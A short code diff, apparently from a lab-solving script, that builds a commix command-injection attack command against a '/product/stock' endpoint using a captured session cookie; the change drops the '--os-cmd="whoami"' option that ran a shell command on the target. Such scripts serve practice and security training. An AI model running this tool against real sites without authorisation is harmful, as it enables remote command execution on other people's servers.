@@ -11,7 +11,7 @@ session_id = cookies.get('session')
 
 full_url = f"{url if url[-1] != '/' else url[:-1]}/product/stock"
 
-command = f"python3 commix.py -u {full_url} --cookie=session=\"{session_id}\" -d \"productId=1&storeId=1\" --batch --os-cmd=\"whoami\""
+command = f"python3 commix.py -u {full_url} --cookie=session=\"{session_id}\" -d \"productId=1&storeId=1\" --batch"
 
 print("Executing command: ", command)
 
